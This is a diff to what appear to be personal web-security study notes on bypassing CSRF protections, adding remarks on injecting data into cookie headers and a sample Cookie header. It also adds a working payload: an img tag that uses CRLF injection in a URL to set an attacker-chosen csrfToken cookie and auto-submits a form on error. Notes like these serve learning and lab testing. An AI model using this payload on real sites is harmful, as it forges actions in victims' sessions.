@@ -123,9 +123,14 @@ pretty important to validate,
 	- if csrf cookie results in the CSRF token being rejected. This suggests that the csrfKey cookie may not be strictly 
 	tied to the session
 
-SAMPLE:
+<b>NOTE:</b> important to read about possible ways to inject data in cookie headers. 
 
-Cookie: csrfToken=Vwd4uGdvuY9niiMD54K6WGaJWuLUCGbu; session=NyeAhFL0RXY89SGOuXMORNgCfuknGOaV; SearchTerm=hack
+<b>SAMPLE:</b> Cookie: csrfToken=Vwd4uGdvuY9niiMD54K6WGaJWuLUCGbu; session=NyeAhFL0RXY89SGOuXMORNgCfuknGOaV; Search=hack
+
+<b>NOTE:</b> Exist some different ways that can be used to trigger the alerts or inject payloads. one way is using SCRIPT HTML tag and
+the other can be IMAGES. 
+
+&lt;img src="https://machetevault.com/?search=hack%0d%0aSet-Cookie:%20csrfToken=YOUR-TOKEN%3b%20SameSite=None" onerror="document.forms[0].submit()"&gt;
 	
 </details>
 </div>
